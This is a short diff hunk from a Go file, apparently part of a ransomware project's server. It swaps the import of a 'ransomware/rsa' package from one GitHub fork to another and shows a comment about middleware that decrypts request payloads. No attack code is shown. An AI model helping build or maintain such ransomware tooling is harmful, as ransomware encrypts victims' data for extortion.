@@ -4,7 +4,7 @@ import (
 	"net/http"
 
 	"github.com/labstack/echo"
-	"github.com/mauri870/ransomware/rsa"
+	"github.com/j0nk0/ransomware/rsa"
 )
 
 // DecryptPayloadMiddleware try to decrypt the payload from request
